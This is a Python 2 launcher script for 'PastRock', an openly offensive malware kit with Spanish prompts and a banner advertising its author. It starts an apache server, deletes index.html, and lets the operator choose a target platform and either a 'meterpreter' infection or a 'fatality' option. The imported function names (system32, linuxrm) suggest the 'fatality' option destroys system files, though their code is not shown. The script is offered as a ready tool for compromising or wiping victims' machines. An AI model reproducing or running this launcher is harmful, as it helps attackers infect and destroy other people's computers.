#!/usr/bin/python
#-*- coding: utf-8 -*-
import os
from linux import *
from windows import *
from osx import osxinfect

print chr(27)+"[3;36m"+"""
[---]        		   PastRock                    [---]
[---]        Created by: Andrés Montoya (SpyRock)      [---]
[---]                    Version: 0.3                  [---]
[---]         		  SpyRock SEC         	       [---]
[---]        Sigueme en Facebook: SpyRock SEC          [---]
[---]        Google plus: Andrés Montoya               [---]    
[---]       Homepage: http://spyrockos.aegae.com       [---]

              Visit: http://spyrockos.aegae.com
"""
print "[x]apache2 start..."

os.system("service apache2 start")

print "[:)]apache esta corriendo!"

print "[*]Limpiando..."

os.system("rm index.html")

plataforma=int(raw_input("""
Eliga plataforma

[1]Windows
[2]Linux
[3]MAC OSX (Pronto)

plataforma: """))

if (plataforma == 1):
	g=raw_input("eliga (meterpreter/fatality) ")
	if g == "meterpreter":
		windowsinfect()
	elif g == "fatality":
		system32()
	else:
		print "error"
elif (plataforma == 2):
	f=raw_input("eliga (meterpreter/fatality) ")
	if f == "meterpreter":
		linuxinfect()
	elif f == "fatality":
		linuxrm()
	else:
		print "error"
elif (plataforma == 3):
	osxinfect()
else:
	print "A la proxima, escribe lo que es."
